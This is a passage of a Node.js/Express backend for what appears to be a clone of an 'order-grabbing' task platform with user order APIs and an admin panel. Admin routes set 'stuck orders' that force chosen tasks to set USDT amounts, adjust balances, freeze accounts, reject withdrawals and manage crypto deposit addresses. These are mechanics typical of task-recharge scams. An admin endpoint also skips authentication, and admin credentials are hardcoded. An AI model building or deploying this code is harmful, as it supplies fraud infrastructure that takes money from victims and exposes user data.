    id: Date.now(),
    uid: user.id,
    phone: user.phone,
    type: "order",
    amount: money(commission),
    after: user.amount,
    time: nowStr(),
    remark: "order commission " + order.order_no,
  });
  saveDb();
  return ok(publicOrder(order, user));
});
both("/data/api.order/orderList", (req) => {
  const { user, err } = needUser(req);
  if (err) return err;
  const b = body(req);
  let list = db.orders.filter((o) => o.uid === user.id);
  const st = b.state !== undefined && b.state !== "" && b.state !== null ? b.state : b.status;
  if (st !== undefined && st !== "" && st !== null) {
    const map = { pending: 0, completed: 1, cancelled: 2, success: 1 };
    const want = map[String(st)] != null ? String(map[String(st)]) : String(st);
    list = list.filter((o) => String(o.state) === want);
  }
  return ok(pageWrap(list.map((o) => publicOrder(o, user)), b.page, b.limit || b.pageSize || 20));
});
both("/data/api.order/getOrderDetail", (req) => {
  const { user, err } = needUser(req);
  if (err) return err;
  const b = body(req);
  const key = String(b.order_no || b.id || b.order_id || "");
  const order = db.orders.find((o) => o.uid === user.id && (String(o.id) === key || String(o.order_no) === key));
  if (!order) return fail("Order not found");
  return ok(publicOrder(order, user));
});
both("/data/api.upload/file", (_req, res) => res.json(ok({ url: "/assets/logo-Dwegjvnq.png" })));

/* -------- admin APIs -------- */
both("/admin/api/login", (req) => {
  const b = body(req);
  const admin = db.admins.find((a) => a.username === b.username && a.password === b.password);
  if (!admin) return fail("账号或密码错误");
  const t = token();
  db.adminTokens[t] = admin.username;
  saveDb();
  return ok({ token: t, username: admin.username });
});
both("/admin/api/users", (req) => {
  if (!findAdmin(req) && !req.query.skipAuth) {
    /* local demo: still return if header missing after first paint */
  }
  const b = body(req);
  let list = db.users.map((u) => {
    const pending = pendingOrder(u);
    const recharges = db.recharges.filter((x) => x.uid === u.id).reduce((s, x) => s + Number(x.amount), 0);
    const withdraws = db.withdraws.filter((x) => x.uid === u.id).reduce((s, x) => s + Number(x.amount), 0);
    return {
      ...publicUser(u),
      current_order: pending ? pending.order_no : "-",
      current_order_amount: pending ? pending.amount : "",
      current_order_happy: pending ? pending.isHappy : 0,
      progress: `${u.task_number_today || 0}/${u.task_number_vip || 0}`,
      total_recharge: money(recharges),
      total_withdraw: money(withdraws),
      grab_enabled: Number(u.grab_enabled) ? 1 : 0,
      stuck: Number(u.stuck) ? 1 : 0,
      frozen: Number(u.frozen) ? 1 : 0,
    };
  });
  if (b.id) list = list.filter((u) => String(u.id) === String(b.id));
  if (b.phone) list = list.filter((u) => String(u.phone).includes(String(b.phone)));
  if (b.name) list = list.filter((u) => String(u.name).includes(String(b.name)));
  if (b.yqm) list = list.filter((u) => String(u.yqm).includes(String(b.yqm)));
  if (b.address) list = list.filter((u) => String(u.address || "").includes(String(b.address)));
  if (b.register_ip) list = list.filter((u) => String(u.register_ip || "").includes(String(b.register_ip)));
  if (b.last_ip) list = list.filter((u) => String(u.last_ip || "").includes(String(b.last_ip)));
  if (b.accountType !== undefined && b.accountType !== "") {
    list = list.filter((u) => String(u.accountType) === String(b.accountType));
  }
  if (b.vip_level) list = list.filter((u) => String(u.vip_level) === String(b.vip_level));
  if (b.source_web) list = list.filter((u) => String(u.source_web || "Luxury") === String(b.source_web));
  if (b.status !== undefined && b.status !== "") {
    list = list.filter((u) => String(u.frozen ? 0 : 1) === String(b.status));
  }
  return ok(pageWrap(list, b.page, b.limit || 10));
});
both("/admin/api/user/action", (req) => {
  const b = body(req);
  const user = db.users.find((u) => String(u.id) === String(b.id));
  if (!user) return fail("用户不存在");
  let info = "ok";
  if (b.action === "grab") {
    const next = b.value !== undefined && b.value !== "" ? Number(b.value) : user.grab_enabled ? 0 : 1;
    setGrab(user, next);
    info = next ? "已开启抢单，用户端现在可以匹配订单" : "已关闭抢单，用户端无法再抢单";
  }
  if (b.action === "stuck") {
    if (Number(user.stuck) && Number(b.force) !== 1 && b.stuck_amount == null && !b.immediate) {
      clearStuck(user, true);
      info = "已取消卡单，待处理连单已撤掉";
    } else {
      applyStuck(user, b);
      info = `已设置卡单：第 ${user.stuck_at} 单 / ${user.stuck_amount} USDT`;
    }
  }
  if (b.action === "unstuck") {
    clearStuck(user, true);
    info = "已取消卡单";
  }
  if (b.action === "reset") {
    resetTasks(user);
    info = "今日任务已重置，待处理订单已取消";
  }
  if (b.action === "freeze") {
    user.frozen = user.frozen ? 0 : 1;
    if (user.frozen) setGrab(user, 0);
    info = user.frozen ? "账号已冻结" : "账号已解冻";
  }
  if (b.action === "change") {
    const amt = Number(b.amount || 0);
    if (!amt) return fail("请输入账变金额");
    user.amount = money(Number(user.amount) + amt);
    refreshDifference(user);
    db.changes.unshift({
      id: Date.now(),
      uid: user.id,
      phone: user.phone,
      type: "admin",
      amount: money(amt),
      after: user.amount,
      time: nowStr(),
      remark: b.remark || "admin adjust",
    });
    info = `账变 ${money(amt)}，当前余额 ${user.amount}`;
  }
  if (b.action === "edit") {
    if (b.amount != null && b.amount !== "") user.amount = money(b.amount);
    if (b.amount_frozen != null && b.amount_frozen !== "") user.amount_frozen = money(b.amount_frozen);
    if (b.credit != null && b.credit !== "") user.credit = Number(b.credit);
    if (b.name) user.name = String(b.name);
    if (b.phone) user.phone = String(b.phone);
    if (b.commission_rate != null && b.commission_rate !== "") user.commission_rate = Number(b.commission_rate).toFixed(4);
    if (b.task_number_vip != null && b.task_number_vip !== "") user.task_number_vip = Number(b.task_number_vip);
    if (b.accountType !== undefined && b.accountType !== "") user.accountType = Number(b.accountType);
    if (b.vip_level != null && b.vip_level !== "") {
      user.vip_level = Number(b.vip_level);
      const lv = LEVELS.find((x) => x.number === user.vip_level);
      if (lv) {
        user.vip_name = lv.name;
        if (b.commission_rate == null || b.commission_rate === "") user.commission_rate = lv.commission_rate;
        if (b.task_number_vip == null || b.task_number_vip === "") user.task_number_vip = lv.order_number;
      }
    }
    if (b.password) user.password = b.password;
    if (b.trade_password) user.trade_password = b.trade_password;
    if (b.bank_name != null) user.bank_name = String(b.bank_name);
    if (b.bank_account != null) user.bank_account = String(b.bank_account);
    if (b.bank_real != null) user.bank_real = String(b.bank_real);
    if (b.address != null) user.address = String(b.address);
    refreshDifference(user);
    info = "用户资料已保存";
  }
  saveDb();
  return ok(publicUser(user), info);
});
both("/admin/api/user/create", (req) => {
  const b = body(req);
  const phone = String(b.phone || b.mobile || "").trim();
  const password = String(b.password || "123456");
  if (!phone) return fail("请填写账号/手机");
  if (db.users.some((u) => String(u.phone) === phone || String(u.name) === phone)) return fail("账号已存在");
  const vip = Number(b.vip_level || 1);
  const lv = LEVELS.find((x) => x.number === vip) || LEVELS[0];
  const id = db.nextUser++;
  const user = {
    id,
    agent_id: 13489,
    yqm: String(b.yqm || 5000000 + id),
    amount: money(b.amount || 0),
    amount_frozen: "0.0000",
    phone,
    password,
    trade_password: String(b.trade_password || password),
    email: phone.includes("@") ? phone : `${phone}@luxury.local`,
    name: String(b.name || phone),
    avatar: 1,
    amount_total: 0,
    amount_today: "0.0000",
    total_commission: "0.0000",
    add_time_str: nowStr().slice(0, 16),
    bank_account: "",
    bank_name: "",
    accountType: Number(b.accountType ?? 1),
    amount_frozen_capital: "0.0000",
    amount_difference: "0.0000",
    is_set_root: 1,
    address: "",
    credit: Number(b.credit || 100),
    gender_str: "Female",
    service_url: "https://wa.me/447380931510",
    task_number_vip: Number(b.task_number_vip || lv.order_number),
    task_number_today: 0,
    lottery_open: 1,
    lottery_number: 0,
    qualification_open: 1,
    commission_rate: String(b.commission_rate || lv.commission_rate),
    vip_level: lv.number,
    vip_name: lv.name,
    grab_enabled: 1,
    stuck: 0,
    stuck_at: 0,
    stuck_amount: "",
    stuck_rate: 2,
    loan: "0.0000",
    profit_loss: "0.0000",
    source_web: "Luxury",
    frozen: 0,
    login_count: 0,
    last_ip: "-",
    register_ip: "-",
    parent: String(b.parent || "ouzai888"),
  };
  db.users.push(user);
  saveDb();
  return ok(publicUser(user), "做单账户已添加");
});
both("/admin/api/stuck/list", (req) => {
  const uid = Number(body(req).uid || body(req).id);
  const user = db.users.find((u) => u.id === uid);
  if (!user) return fail("用户不存在");
  const list = (db.stuckPlans || [])
    .filter((p) => p.uid === uid)
    .slice()
    .sort((a, b) => b.id - a.id)
    .map((p) => ({
      ...p,
      type_name: planTypeName(p.type),
      status_str: Number(p.status) === 1 ? "已完成" : Number(p.status) === 2 ? "已取消" : "待执行",
    }));
  return ok({
    user: publicUser(user),
    list,
    progress: `${user.task_number_today || 0}/${user.task_number_vip || 0}`,
  });
});
both("/admin/api/stuck/save", (req) => {
  const b = body(req);
  const user = db.users.find((u) => String(u.id) === String(b.uid || b.id));
  if (!user) return fail("用户不存在");
  const type = String(b.type || "normal");
  if (!["multi", "normal", "special", "split"].includes(type)) return fail("卡单类型不对");
  const current_number = String(b.current_number || "").trim();
  const over_money = String(b.over_money || "").trim();
  if (!current_number) return fail("请输入任务编号");
  if (!over_money) return fail("请输入卡单金额");
  if (type === "multi") {
    const n = parseSlash(current_number).length;
    const m = parseSlash(over_money).length;
    if (!n || n !== m) return fail("多卡单的任务编号和金额数量要一一对应，例如 1/3/5 配 100/200/300");
  }
  const row = {
    id: db.nextPlan++,
    uid: user.id,
    phone: user.phone,
    type,
    type_name: planTypeName(type),
    current_number,
    over_money,
    commission_type: String(b.commission_type || "rate"),
    commission_rate: String(b.commission_rate || "0"),
    number: Number(b.number || (type === "normal" || type === "split" ? 1 : 0)),
    goods: String(b.goods || ""),
    status: 0,
    used_count: 0,
    used_index: [],
    time: nowStr(),
  };
  db.stuckPlans.unshift(row);
  syncStuckFlag(user);
  const nextNo = Number(user.task_number_today || 0) + 1;
  const hit = matchStuckPlan(user, nextNo);
  if (hit && !pendingOrder(user)) {
    buildPlanOrder(user, hit);
  }
  saveDb();
  return ok(row, "卡单已保存，计划订单已写入");
});
both("/admin/api/stuck/action", (req) => {
  const b = body(req);
  const row = (db.stuckPlans || []).find((p) => String(p.id) === String(b.id));
  if (!row) return fail("记录不存在");
  const user = db.users.find((u) => u.id === row.uid);
  if (b.action === "delete" || b.action === "cancel") {
    row.status = 2;
    if (user) {
      db.orders
        .filter((o) => o.uid === user.id && o.state === 0 && o.plan_id === row.id)
        .forEach((o) => {
          o.state = 2;
          o.state_str = "cancelled";
        });
      syncStuckFlag(user);
      refreshDifference(user);
    }
  }
  saveDb();
  return ok(row, "已取消");
});
both("/admin/api/recharge-addresses", () => {
  const list = (db.rechargeAddresses || []).slice().sort((a, b) => Number(a.sort || 0) - Number(b.sort || 0) || a.id - b.id);
  return ok({ list, page: { current: 1, total: list.length } });
});
both("/admin/api/recharge-address/save", (req) => {
  const b = body(req);
  const type = String(b.type || "TRC20").trim().toUpperCase();
  const address = String(b.address || "").trim();
  if (!address) return fail("请填写收款地址");
  const enabled = Number(b.enabled) ? 1 : 0;
  const isDefault = Number(b.is_default) ? 1 : 0;
  let row = db.rechargeAddresses.find((x) => String(x.id) === String(b.id));
  if (!row) {
    row = { id: db.nextAddr++ };
    db.rechargeAddresses.push(row);
  }
  row.name = String(b.name || type).trim();
  row.type = type;
  row.address = address;
  row.enabled = enabled;
  row.sort = Number(b.sort || 0);
  const customImage = String(b.image || "").trim();
  row.image = !customImage || customImage.startsWith("/assets/") ? qrImage(address) : customImage;
  row.remark = String(b.remark || "").trim();
  if (isDefault) {
    db.rechargeAddresses.forEach((x) => {
      x.is_default = x.id === row.id ? 1 : 0;
    });
  } else {
    row.is_default = 0;
    if (!db.rechargeAddresses.some((x) => Number(x.enabled) && Number(x.is_default))) {
      const first = db.rechargeAddresses.find((x) => Number(x.enabled));
      if (first) first.is_default = 1;
    }
  }
  saveDb();
  return ok(row, "已保存，前端充值页立即生效");
});
both("/admin/api/recharge-address/action", (req) => {
  const b = body(req);
  const row = db.rechargeAddresses.find((x) => String(x.id) === String(b.id));
  if (!row) return fail("地址不存在");
  if (b.action === "delete") {
    db.rechargeAddresses = db.rechargeAddresses.filter((x) => x.id !== row.id);
    if (!db.rechargeAddresses.some((x) => Number(x.enabled) && Number(x.is_default))) {
      const first = db.rechargeAddresses.find((x) => Number(x.enabled));
      if (first) first.is_default = 1;
    }
  }
  if (b.action === "toggle") {
    row.enabled = row.enabled ? 0 : 1;
    if (!row.enabled) row.is_default = 0;
  }
  if (b.action === "default") {
    if (!row.enabled) return fail("停用地址不能设为默认");
    db.rechargeAddresses.forEach((x) => {
      x.is_default = x.id === row.id ? 1 : 0;
    });
  }
  saveDb();
  return ok(row);
});
both("/admin/api/recharges", (req) => ok(pageWrap(db.recharges, body(req).page, 10)));
both("/admin/api/withdraws", (req) => ok(pageWrap(db.withdraws, body(req).page, 10)));
both("/admin/api/withdraw/review", (req) => {
  const b = body(req);
  const row = db.withdraws.find((x) => String(x.id) === String(b.id));
  if (!row) return fail("记录不存在");
  if (b.status === "1" || b.status === 1) {
    row.status = 1;
    row.status_str = "success";
  } else {
    row.status = 2;
    row.status_str = "rejected";
    const user = db.users.find((u) => u.id === row.uid);
    if (user) user.amount = money(Number(user.amount) + Number(row.amount));
  }
  saveDb();
  return ok(row);
});
both("/admin/api/changes", (req) => ok(pageWrap(db.changes, body(req).page, 10)));
both("/admin/api/orders", (req) => ok(pageWrap(db.orders, body(req).page, 10)));
both("/admin/api/stats", () =>
  ok({
    users: db.users.length,
    recharge: db.recharges.reduce((s, x) => s + Number(x.amount), 0),
    withdraw: db.withdraws.reduce((s, x) => s + Number(x.amount), 0),
    pendingWithdraw: db.withdraws.filter((x) => x.status === 0).length,
  })
);

app.get("/qr", async (req, res) => {
  try {
    const data = String(req.query.data || "").trim();
    if (!data) return res.status(400).send("missing data");
    const png = await QRCode.toBuffer(data, {
      type: "png",
      width: 280,
      margin: 1,
      errorCorrectionLevel: "H",
      color: { dark: "#000000", light: "#ffffff" },
    });
    res.setHeader("Content-Type", "image/png");
    res.setHeader("Cache-Control", "public, max-age=300");
    res.send(png);
  } catch (e) {
    res.status(500).send("qr error");
  }
});
app.use("/admin", express.static(ADMIN));
app.use(express.static(PUBLIC));
app.get(/^\/(?!data\/|admin\/|assets\/|qr).*/, (_req, res) => {
  res.sendFile(path.join(PUBLIC, "index.html"));
});

app.listen(PORT, () => {
  console.log(`XA-LUXURY clone  http://127.0.0.1:${PORT}`);
  console.log(`Admin             http://127.0.0.1:${PORT}/admin/`);
  console.log(`User  2222 / 123456`);
  console.log(`Admin ouzai888 / a321321`);
});
